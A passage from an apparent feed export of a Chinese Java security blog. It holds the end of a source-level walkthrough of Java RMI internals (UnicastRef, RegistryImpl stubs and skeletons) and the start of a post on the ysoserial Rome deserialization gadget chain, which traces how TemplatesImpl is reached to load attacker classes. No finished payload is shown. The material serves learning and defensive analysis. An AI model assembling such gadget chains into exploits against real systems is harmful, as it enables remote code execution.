class="line">                          getMethodHash(method));</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        if (!(e instanceof RuntimeException)) &#123;</span><br><span class="line">            Class&lt;?&gt; cl = proxy.getClass();</span><br><span class="line">            try &#123;</span><br><span class="line">                method = cl.getMethod(method.getName(),</span><br><span class="line">                                      method.getParameterTypes());</span><br><span class="line">            &#125; catch (NoSuchMethodException nsme) &#123;</span><br><span class="line">                throw (IllegalArgumentException)</span><br><span class="line">                    new IllegalArgumentException().initCause(nsme);</span><br><span class="line">            &#125;</span><br><span class="line">            Class&lt;?&gt; thrownType = e.getClass();</span><br><span class="line">            for (Class&lt;?&gt; declaredType : method.getExceptionTypes()) &#123;</span><br><span class="line">                if (declaredType.isAssignableFrom(thrownType)) &#123;</span><br><span class="line">                    throw e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            e = new UnexpectedException(&quot;unexpected exception&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">        throw e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上就是调用了 ref 的 invoke 方法来处理。ref 在定义中是 RemoteRef 类型，实际调用时调用的是 RemoteRef 的子类 UnicastRef 的 invoke 方法。</p><p>UnicastRef 的 invoke 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Remote var1, Method var2, Object[] var3, long var4) throws Exception &#123;</span><br><span class="line">    if (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, &quot;method: &quot; + var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        this.logClientCall(var1, var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Connection var6 = this.ref.getChannel().newConnection();</span><br><span class="line">    StreamRemoteCall var7 = null;</span><br><span class="line">    boolean var8 = true;</span><br><span class="line">    boolean var9 = false;</span><br><span class="line"></span><br><span class="line">    Object var13;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, &quot;opnum = &quot; + var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var7 = new StreamRemoteCall(var6, this.ref.getObjID(), -1, var4);</span><br><span class="line"></span><br><span class="line">        Object var11;</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectOutput var10 = var7.getOutputStream();</span><br><span class="line">            this.marshalCustomCallData(var10);</span><br><span class="line">            var11 = var2.getParameterTypes();</span><br><span class="line"></span><br><span class="line">            for(int var12 = 0; var12 &lt; ((Object[])var11).length; ++var12) &#123;</span><br><span class="line">                marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (IOException var41) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, &quot;IOException marshalling arguments: &quot;, var41);</span><br><span class="line">            throw new MarshalException(&quot;error marshalling arguments&quot;, var41);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var7.executeCall();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Class var49 = var2.getReturnType();</span><br><span class="line">            if (var49 == Void.TYPE) &#123;</span><br><span class="line">                var11 = null;</span><br><span class="line">                return var11;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var11 = var7.getInputStream();</span><br><span class="line">            Object var50 = unmarshalValue(var49, (ObjectInput)var11);</span><br><span class="line">            var9 = true;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, &quot;free connection (reuse = true)&quot;);</span><br><span class="line">            this.ref.getChannel().free(var6, true);</span><br><span class="line">            var13 = var50;</span><br><span class="line">        &#125; catch (IOException var42) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, &quot;IOException unmarshalling return: &quot;, var42);</span><br><span class="line">            throw new UnmarshalException(&quot;error unmarshalling return&quot;, var42);</span><br><span class="line">        &#125; catch (ClassNotFoundException var43) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, &quot;ClassNotFoundException unmarshalling return: &quot;, var43);</span><br><span class="line">            throw new UnmarshalException(&quot;error unmarshalling return&quot;, var43);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                var7.done();</span><br><span class="line">            &#125; catch (IOException var40) &#123;</span><br><span class="line">                var8 = false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException var45) &#123;</span><br><span class="line">        if (var7 == null || ((StreamRemoteCall)var7).getServerException() != var45) &#123;</span><br><span class="line">            var8 = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        throw var45;</span><br><span class="line">    &#125; catch (RemoteException var46) &#123;</span><br><span class="line">        var8 = false;</span><br><span class="line">        throw var46;</span><br><span class="line">    &#125; catch (Error var47) &#123;</span><br><span class="line">        var8 = false;</span><br><span class="line">        throw var47;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        if (!var9) &#123;</span><br><span class="line">            if (clientRefLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF, &quot;free connection (reuse = &quot; + var8 + &quot;)&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            this.ref.getChannel().free(var6, var8);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return var13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说，UnicastRef 的 invoke 方法实现了一个远程方法调用（RMI）的核心逻辑。</p><p>它通过 <code>this.ref.getChannel().newConnection()</code> 创建一个新的连接，使用 <code>StreamRemoteCall</code> 创建一个新的远程调用对象，将方法参数序列化并发送给远程对象，执行执行远程方法调用后，根据方法的返回类型反序列化返回值，并返回给调用者。</p><p>其中，反序列化在 UnicastRef 的 unmarshalValue 方法中实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">protected static Object unmarshalValue(Class&lt;?&gt; var0, ObjectInput var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    if (var0.isPrimitive()) &#123;</span><br><span class="line">        if (var0 == Integer.TYPE) &#123;</span><br><span class="line">            return var1.readInt();</span><br><span class="line">        &#125; else if (var0 == Boolean.TYPE) &#123;</span><br><span class="line">            return var1.readBoolean();</span><br><span class="line">        &#125; else if (var0 == Byte.TYPE) &#123;</span><br><span class="line">            return var1.readByte();</span><br><span class="line">        &#125; else if (var0 == Character.TYPE) &#123;</span><br><span class="line">            return var1.readChar();</span><br><span class="line">        &#125; else if (var0 == Short.TYPE) &#123;</span><br><span class="line">            return var1.readShort();</span><br><span class="line">        &#125; else if (var0 == Long.TYPE) &#123;</span><br><span class="line">            return var1.readLong();</span><br><span class="line">        &#125; else if (var0 == Float.TYPE) &#123;</span><br><span class="line">            return var1.readFloat();</span><br><span class="line">        &#125; else if (var0 == Double.TYPE) &#123;</span><br><span class="line">            return var1.readDouble();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new Error(&quot;Unrecognized primitive type: &quot; + var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="调用栈总结-1"><a href="#调用栈总结-1" class="headerlink" title="调用栈总结"></a>调用栈总结</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RemoteObjectInvocationHandler#invoke(Object, Method, Object[])</span><br><span class="line">RemoteObjectInvocationHandler#invokeRemoteMethod(Object, Method, Object[])</span><br><span class="line">UnicastRef#invoke(Remote, Method, Object[], long)</span><br><span class="line">UnicastRef#unmarshalValue(Class&lt;?&gt;, ObjectInput) # 反序列化</span><br></pre></td></tr></table></figure><h4 id="注册中心创建-LocateRegistry-createRegistry"><a href="#注册中心创建-LocateRegistry-createRegistry" class="headerlink" title="注册中心创建 - LocateRegistry#createRegistry"></a>注册中心创建 - LocateRegistry#createRegistry</h4><p>LocateRegistry 的 createRegistry 方法：</p><img src="/images/image-20240613110247306.png"><p>这里实际是调用 RegistryImpl 的构造方法 new 了一个 RegistryImpl 对象。</p><p>RegistryImpl 的构造方法：</p><img src="/images/image-20240613110830043.png"><p>这边新建了一个 LiveRef 对象，将这个 LiveRef 对象作为参数又新建了 UnicastServerRef 对象，最后调用 setup 进行配置。</p><p>跟进 RegistryImpl 的 setup 方法：</p><img src="/images/image-20240613111357223.png"><p>这边依旧是调用了 UnicastServerRef 的 exportObject 方法来导出远程对象，只不过这次 export 的是 RegistryImpl 这个对象。</p><p>跟进 UnicastServerRef 的 exportObject 方法：</p><img src="/images/image-20240614091049086.png"><p>再进入 Util 的 createProxy 方法：</p><img src="/images/image-20240614085655284.png"><p>这里在创建代理对象之前其实有一个判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2 || !ignoreStubClasses &amp;&amp; stubClassExists(var3)</span><br></pre></td></tr></table></figure><p>Java 中 &amp;&amp; 运算符的优先级高于 || 运算符，即 &amp;&amp; 会先计算，因此这个判断等同于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2 || (!ignoreStubClasses &amp;&amp; stubClassExists(var3))</span><br></pre></td></tr></table></figure><p>所以大概意思就是如果 stub 存在且不忽视，或者强制使用，那么直接创建 Stub 。</p><p>具体来看 Util 的 stubClassExists 方法：</p><img src="/images/image-20240614091618479.png"><p>这里其实就是在判断传入的 var0 是否在本地有一个存根类，即 var0 的名称后面加上 “_Stub” 的类。梳理整个逻辑，会发现 var0 的值是 </p><p>getRemoteClass(RegistryImpl.getClass())，最终，var0.getName() 获取到的值是 sun.rmi.registry.RegistryImpl ：</p><img src="/images/image-20240614093409294.png"><p>这里返回 true ，就说明存在 RegistryImpl_Stub 这个类，搜一下其实也搜得到：</p><img src="/images/image-20240614093815544.png"><img src="/images/image-20240614093836838.png"><p>RegistryImpl_Stub 实现了 bind&#x2F;list&#x2F;lookup&#x2F;rebind&#x2F;unbind 等 Registry 定义的方法，其中用一些序列化方法来实现：</p><img src="/images/image-20240614102729976.png"><p>好的，回到先前的判断 <code>var2 || !ignoreStubClasses &amp;&amp; stubClassExists(var3)</code> ，这个判断的结果应当为真，并执行 createStub 方法：</p><img src="/images/image-20240614103417153.png"><p>createStub 方法的执行结果其实就是返回了 RegistryImpl_Stub 对象：</p><img src="/images/image-20240614103812744.png"><p>那么现在 Util.createProxy 分析完了，回到 UnicastServerRef 的 exportObject 方法，接下来将会调用 setSkeleton 方法：</p><img src="/images/image-20240614104133467.png"><p>UnicastServerRef 的 setSkeleton 方法判断如果 withoutSkeletons 不存在这个 key ，则调用 Util.createSkeleton 创建 Skeleton ：</p><img src="/images/image-20240614105112083.png"><p>Util 的 createSkeleton 方法：</p><img src="/images/image-20240614105442446.png"><p>这里的参数 var0 是一个 RegistryImpl 对象，所以 var1 依旧是 getRemoteClass(RegistryImpl.getClass()) ，这个方法最终返回一个 RegistryImpl_Skel 对象。</p><p>RegistryImpl_Skel 对象方法不多，主要方法是 dispatch ：</p><img src="/images/image-20240614111625118.png"><p>其中主要的逻辑就是根据不同的情况调用不同的方法，比如 rebind&#x2F;unbind 之类。</p><h6 id="调用栈总结-2"><a href="#调用栈总结-2" class="headerlink" title="调用栈总结"></a>调用栈总结</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry#createRegistry(int)</span><br><span class="line">RegistryImpl#RegistryImpl(int)</span><br><span class="line">RegistryImpl#setup(UnicastServerRef)</span><br><span class="line">UnicastServerRef#exportObject(Remote, Object, boolean)</span><br><span class="line">-&gt; Util#createProxy(Class&lt;?&gt;, RemoteRef, boolean)</span><br><span class="line">   Util#createStub(Class&lt;?&gt;, RemoteRef) # 返回 RegistryImpl_Stub 对象</span><br><span class="line">-&gt; UnicastServerRef#setSkeleton(Remote)</span><br><span class="line">   Util#createSkeleton(Remote) # 返回 RegistryImpl_Skel 对象</span><br></pre></td></tr></table></figure><h4 id="服务端获取-Registry-代理对象"><a href="#服务端获取-Registry-代理对象" class="headerlink" title="服务端获取 Registry 代理对象"></a>服务端获取 Registry 代理对象</h4><p>rebind 或者 bind 都可以，这里用 bind 和 rebind 的区别在于：bind 方法用于将一个远程对象绑定到指定的名称上，如果该名称已经被绑定过，则会抛出 AlreadyBoundException 异常。rebind 方法用于将一个远程对象绑定到指定的名称上。如果该名称已经被绑定过，则会重新绑定，即覆盖旧的绑定，而不会抛出异常。</p><h6 id="情况一：Server-和-Registry-在同一端"><a href="#情况一：Server-和-Registry-在同一端" class="headerlink" title="情况一：Server 和 Registry 在同一端"></a>情况一：Server 和 Registry 在同一端</h6><p>当 Server 和 Registry 在同一端时，Server 端通过本地调用获取 Registry 对象。此时，Server 端获取到的 Registry 对象是 RegistryImpl 类的实例，这是 RMI 的默认实现类。服务器大多数情况下与注册中心 Registry 在同一端。</p><p>这里的 registry 就是 RegistryImpl 对象：</p><img src="/images/image-20240628161323912.png"><p>于是跟进 RegistryImpl 的 rebind 方法：</p><img src="/images/image-20240628162405443.png"><p>这里直接将远程对象放入了 RegistryImpl 内部的 HashTable 集合中。</p><h6 id="情况二：Server-和-Registry-在不同端"><a href="#情况二：Server-和-Registry-在不同端" class="headerlink" title="情况二：Server 和 Registry 在不同端"></a>情况二：Server 和 Registry 在不同端</h6><p>当 Server 和 Registry 在不同端时，Server 端通过网络获取 Registry 对象。此时，Server 端获取到的 Registry 对象是 RegistryImpl_Stub 类的实例。这个类是 RMI 生成的代理类，代表远程的注册表对象。</p><p>下面给出在此情况下服务器获取 Registry 对象的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String registryHost = &quot;remote-registry-host&quot;; // 远程 Registry 主机名或 IP</span><br><span class="line">int registryPort = 1099; // 远程 Registry 端口号</span><br><span class="line"></span><br><span class="line">// 在远程 Registry 上绑定服务</span><br><span class="line">Registry registry = LocateRegistry.getRegistry(registryHost, registryPort);</span><br><span class="line">registry.rebind(&quot;Hello&quot;, obj);</span><br></pre></td></tr></table></figure><p>可以看到此时获取的是 RegistryImpl_Stub 对象：</p><img src="/images/image-20240628172346590.png"><p>跟进 RegistryImpl_Stub 的 rebind 方法：</p><img src="/images/image-20240704133850976.png"><p>调试起来可以看到：这里的 super.ref 是 UnicastRef 对象，接下来会接连调用 UnicastRef 的 newCall 方法、invoke 方法和 done 方法。</p><p>UnicastRef 的 newCall 方法返回一个 RemoteCall 对象，用来给 invoke 方法提供参数。</p><p>跟进 UnicastRef 的 newCall 方法：</p><img src="/images/image-20240704135020575.png"><p>可以看到，这里的操作是建立通信，然后 new 了一个 StreamRemoteCall 对象并将其返回，且其中还调用了 UnicastRef 的 marshalCustomCallData 方法。</p><p>但奇怪的是 marshalCustomCallData 方法并没有进行任何操作：</p><img src="/images/image-20240704140246926.png"><p>接下来看 UnicastRef 的 invoke 方法：</p><img src="/images/image-20240704134416503.png"><p>执行的是 RemoteCall 的实现类 StreamRemoteCall 的 executeCall 方法。</p><p>总的来说，就是服务端通过调用 RegistryImpl_Stub 的 rebind 方法，将参数序列化发送到 Registry 端，来完成将服务接口绑定到注册表的操作。</p><h6 id="Registry-端处理逻辑"><a href="#Registry-端处理逻辑" class="headerlink" title="Registry 端处理逻辑"></a>Registry 端处理逻辑</h6><p>当 Server 和 Registry 在不同端时，在 Registry 端，由 sun.rmi.transport.tcp.TCPTransport#handleMessages 来处理请求，调用 serviceCall 方法处理：</p><img src="/images/image-20240705113118978.png"><p>这里实际调用的是 Transport 的 serviceCall 方法，跟进 Transport 的 serviceCall 方法：</p><img src="/images/image-20240705113259512.png"><p>disp 获取到的是 UnicastServerRef 对象，这里会调用 UnicastServerRef 的 dispatch 方法，跟进 UnicastServerRef 的 dispatch 方法：</p><img src="/images/image-20240705113446620.png"><p>dispatch 方法又调用 UnicastServerRef 自身的 oldDispatch 方法，跟进 UnicastServerRef 的 oldDispatch 方法：</p><img src="/images/image-20240705113637011.png"><p>最终调用 RegistryImpl_Skel 的 dispatch 方法，来看看  RegistryImpl_Skel 的 dispatch 方法：</p><img src="/images/image-20240705114000367.png"><p>RegistryImpl_Skel 的 dispatch 方法根据流中写入的不同的操作类型分发给不同的方法处理，例如 0 代表着 bind 方法，则从流中读取对应的内容，反序列化，然后调用 RegistryImpl 的 bind 方法进行绑定。</p><p>我用的是 rebind ，对应的是 3 ：</p><img src="/images/image-20240705114905739.png"><p>以上就是 Registry 端的处理逻辑。</p><h4 id="Client-端服务调用"><a href="#Client-端服务调用" class="headerlink" title="Client 端服务调用"></a>Client 端服务调用</h4><p>客户端获取 Registry 对象的方法与服务端远程获取 Registry 的方法一样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br></pre></td></tr></table></figure><p>客户端获取到的也是 RegistryImpl_Stub 对象：</p><img src="/images/image-20240708135731555.png"><p>客户端调用 RegistryImpl_Stub 的 lookup 方法，跟进 RegistryImpl_Stub 的 lookup 方法：</p><img src="/images/image-20240708140409880.png"><p>与 rebind 方法相同，调用 UnicastRef 的 newCall、invoke、done 方法建立通信，将参数序列化发送到 Registry 端，再将返回结果反序列化。</p><p>同样来关注 Registry 端的处理逻辑，与 Server 端调用 rebind 方法时 Registry 端的处理逻辑相同，最终都是调用 RegistryImpl_Skel 的 dispatch 方法来处理。</p><p>lookup 方法对应的是 RegistryImpl_Skel 的 dispatch 方法中的 2 号处理逻辑：</p><img src="/images/image-20240708141025817.png"><p>最后客户端通过 lookup 方法获取到服务的代理对象：</p><img src="/images/image-20240708141810878.png"><p>代理对象的任意方法被调用，都会触发 RemoteObjectInvocationHandler 的 invoke 方法。前面分析过了， RemoteObjectInvocationHandler 的 invoke 方法最终其实是调用 RemoteRef 的实现类 UnicastRef 的 invoke 方法。UnicastRef 中保存了服务端的地址和端口信息，这些信息是在服务端导出远程对象时设置的。因此 Client 端直接与 Server 端进行通信。</p><p>Server 端由 UnicastServerRef 的 dispatch 方法来处理客户端的请求，然后将结果序列化给 Client 端，Client 端拿到结果反序列化，完成整个调用的过程。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这里引用素十八师傅的原图：</p><img src="/images/image-20240708141810879.png"><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://javasec.org/javase/RMI/">RMI</a> </p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577">RMI 远程调用</a> </p><p><a href="https://blog.csdn.net/Shadow_Light/article/details/105587008">RMI 原理浅析以及调用流程</a></p><p><a href="https://su18.org/post/rmi-attack/">素十八 - Java RMI 攻击由浅入深</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;RMI 入门案例及源码分析&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - Java 反序列化之 Rome 链</title>
    <link href="https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-06-07T09:44:56.493Z</published>
    <updated>2024-06-08T02:09:34.766Z</updated>
    
    <content type="html"><![CDATA[<p>ROME 是一个强大的 Java 库，用于解析和生成各种格式的 RSS 和 Atom feeds 。它兼容多种版本的 RSS（包括 RSS 0.90、0.91、0.92、0.93、0.94、1.0 和 2.0 ）和 Atom（包括 0.3 和 1.0 ）。ROME 提供了一个统一的 API ，简化了处理不同 feed 格式的复杂性。</p><span id="more"></span><h2 id="前置知识概览"><a href="#前置知识概览" class="headerlink" title="前置知识概览"></a>前置知识概览</h2><h4 id="Rome-介绍"><a href="#Rome-介绍" class="headerlink" title="Rome 介绍"></a>Rome 介绍</h4><p>ROME 是一个强大的 Java 库，用于解析和生成各种格式的 RSS 和 Atom feeds 。它兼容多种版本的 RSS（包括 RSS 0.90、0.91、0.92、0.93、0.94、1.0 和 2.0 ）和 Atom（包括 0.3 和 1.0 ）。ROME 提供了一个统一的 API ，简化了处理不同 feed 格式的复杂性。</p><h4 id="什么是-feed"><a href="#什么是-feed" class="headerlink" title="什么是 feed"></a>什么是 feed</h4><p>在 Web 技术中，” feed “ 指的是一种特定的格式，应用于定期更新和发布内容的文件。它允许用户通过订阅机制获取最新的内容更新。Feed 通常用于博客、新闻网站、播客和其他频繁更新的网站，以便用户可以集中阅读和获取最新的内容，而无需逐一访问这些网站。</p><p><strong>Feed 的工作原理</strong> </p><ol><li>发布：网站创建和发布 feed 文件，这个文件包含最新的内容更新。</li><li>订阅：用户通过 feed 阅读器订阅该 feed 。阅读器会定期检查 feed 文件的更新。</li><li>通知：当 feed 文件更新时，阅读器会下载新的内容并通知用户。</li></ol><p><strong>Feed 的常见格式</strong> </p><ol><li><strong>RSS</strong> (Really Simple Syndication)：RSS 是一种 XML 格式，用于描述网站内容的更新。RSS 最初由 Netscape 在 1999 年开发，目的是方便内容的聚合和订阅。RSS 有多个版本，最常用的是 RSS 2.0 。</li><li><strong>Atom</strong>：Atom 是一种 XML 格式，用于描述和同步 Web 内容的更新。它是由 IETF（互联网工程任务组）在 2005 年发布的标准，比 RSS 稍晚推出，目的是解决 RSS 的一些局限性。</li></ol><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我个人本次实验环境为：</p><ul><li>JDK &#x3D; 8u71</li><li>rome &#x3D; 1.0</li></ul><p>导入 rome 依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="ysoserial-利用链分析"><a href="#ysoserial-利用链分析" class="headerlink" title="ysoserial 利用链分析"></a>ysoserial 利用链分析</h2><p>核心在于利用 ToStringBean#toString() 调用 TemplatesImpl#getOutputProperties() 提前类加载。</p><h4 id="TemplatesImpl-getOutputProperties"><a href="#TemplatesImpl-getOutputProperties" class="headerlink" title="TemplatesImpl#getOutputProperties()"></a>TemplatesImpl#getOutputProperties()</h4><p>TemplatesImpl 的 getOutputProperties() 方法会调用 newTransformer() ，进而造成类加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Properties getOutputProperties() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    catch (TransformerConfigurationException e) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后的利用链就是 TemplatesImpl 的常规用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">TemplatesImpl#getTransletInstance()</span><br><span class="line">TemplatesImpl#defineTransletClasses()</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><h4 id="BeanIntrospector-getPDs-Class"><a href="#BeanIntrospector-getPDs-Class" class="headerlink" title="BeanIntrospector#getPDs(Class)"></a>BeanIntrospector#getPDs(Class)</h4><p>BeanIntrospector 的 getPDs 方法会利用反射获取传入的 Class 对象的所有 public 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private static PropertyDescriptor[] getPDs(Class klass) throws IntrospectionException &#123;</span><br><span class="line">// 利用反射获取传入的 Class 对象的所有 public 方法</span><br><span class="line">    Method[] methods = klass.getMethods();</span><br><span class="line">    Map getters = getPDs(methods,false);</span><br><span class="line">    Map setters = getPDs(methods,true);</span><br><span class="line">    List pds     = merge(getters,setters);</span><br><span class="line">    PropertyDescriptor[] array = new PropertyDescriptor[pds.size()];</span><br><span class="line">    pds.toArray(array);</span><br><span class="line">    return array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里选择传入 Templates.class 作为参数，原因是 Templates 接口中只定义了两个方法，且包含我们所需要的 getOutputProperties()，可以排除大量干扰。</p><h4 id="BeanIntrospector-getPropertyDescriptors-Class"><a href="#BeanIntrospector-getPropertyDescriptors-Class" class="headerlink" title="BeanIntrospector#getPropertyDescriptors(Class)"></a>BeanIntrospector#getPropertyDescriptors(Class)</h4><p>BeanIntrospector 的 getPropertyDescriptors 方法调用了 getPDs 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static synchronized PropertyDescriptor[] getPropertyDescriptors(Class klass) throws IntrospectionException &#123;</span><br><span class="line">    PropertyDescriptor[] descriptors = (PropertyDescriptor[]) _introspected.get(klass);</span><br><span class="line">    if (descriptors==null) &#123;</span><br><span class="line">    // 